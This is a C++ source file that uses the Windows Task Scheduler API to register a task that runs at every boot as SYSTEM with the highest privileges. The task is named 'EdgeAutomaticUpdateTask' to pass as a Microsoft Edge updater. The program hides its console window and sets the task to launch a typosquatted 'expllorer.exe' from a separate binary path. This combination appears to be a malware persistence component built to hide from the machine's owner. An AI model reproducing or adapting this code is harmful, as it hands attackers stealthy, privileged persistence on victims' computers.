#include"bin/MustInclude.h"
#include <Windows.h>
#include <comdef.h>
#include <taskschd.h>
#include <iostream>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")

/**
 * @brief 创建开机管理员权限启动任务
 * @param programPath 程序完整路径（如L"C:\\App\\MyApp.exe"）
 * @return 成功返回true，失败返回false（错误信息输出到stderr）
 */
bool CreateAdminStartupTask(const wchar_t* programPath) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        std::wcerr << L"COM初始化失败: 0x" << std::hex << hr << std::endl;
        return false;
    }

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) {
        std::wcerr << L"创建TaskService失败: 0x" << std::hex << hr << std::endl;
        CoUninitialize();
        return false;
    }

    // 连接到本地任务服务
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        std::wcerr << L"连接任务服务失败: 0x" << std::hex << hr << std::endl;
        pService->Release();
        CoUninitialize();
        return false;
    }

    // 创建任务定义
    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) {
        std::wcerr << L"创建任务定义失败: 0x" << std::hex << hr << std::endl;
        pService->Release();
        CoUninitialize();
        return false;
    }

    // 配置任务设置
    ITaskSettings* pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (SUCCEEDED(hr)) {
        pSettings->put_StartWhenAvailable(VARIANT_TRUE);
        pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
        pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
        pSettings->Release();
    }

    // 配置安全选项（管理员权限）
    IPrincipal* pPrincipal = NULL;
    hr = pTask->get_Principal(&pPrincipal);
    if (SUCCEEDED(hr)) {
        pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST); // 管理员权限
        pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
        pPrincipal->Release();
    }

    // 添加开机触发器
    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (SUCCEEDED(hr)) {
        ITrigger* pTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_BOOT, &pTrigger);
        if (SUCCEEDED(hr)) {
            IBootTrigger* pBootTrigger = NULL;
            hr = pTrigger->QueryInterface(IID_IBootTrigger, (void**)&pBootTrigger);
            if (SUCCEEDED(hr)) {
                pBootTrigger->put_Id(_bstr_t(L"BootTrigger"));
                pBootTrigger->Release();
            }
            pTrigger->Release();
        }
        pTriggerCollection->Release();
    }

    // 添加执行操作
    IActionCollection* pActionCollection = NULL;
    hr = pTask->get_Actions(&pActionCollection);
    if (SUCCEEDED(hr)) {
        IAction* pAction = NULL;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        if (SUCCEEDED(hr)) {
            IExecAction* pExecAction = NULL;
            hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
            if (SUCCEEDED(hr)) {
                pExecAction->put_Path(_bstr_t(programPath));
                pExecAction->Release();
            }
            pAction->Release();
        }
        pActionCollection->Release();
    }

    // 注册任务
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (SUCCEEDED(hr)) {
        _variant_t varTaskName(L"EdgeAutomaticUpdateTask");
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(L"EdgeAutomaticUpdateTask"), // 任务名称
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(L"SYSTEM"),       // 使用SYSTEM账户
            _variant_t(),                // 密码
            TASK_LOGON_SERVICE_ACCOUNT,  // 登录类型
            _variant_t(L""),             // 空sddl
            NULL                         // 返回任务
        );
        pRootFolder->Release();
    }

    // 清理资源
    pTask->Release();
    pService->Release();
    CoUninitialize();

    if (FAILED(hr)) {
        std::wcerr << L"注册任务失败: 0x" << std::hex << hr << std::endl;
        _com_error err(hr);
        std::wcerr << L"错误信息: " << err.ErrorMessage() << std::endl;
        return false;
    }

    return true;
}

int main () {
	HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
	CreateAdminStartupTask(wstring(wstring(SECOND_BIN_PATH)+wstring(L"expllorer.exe")).c_str());
	return 0;
}

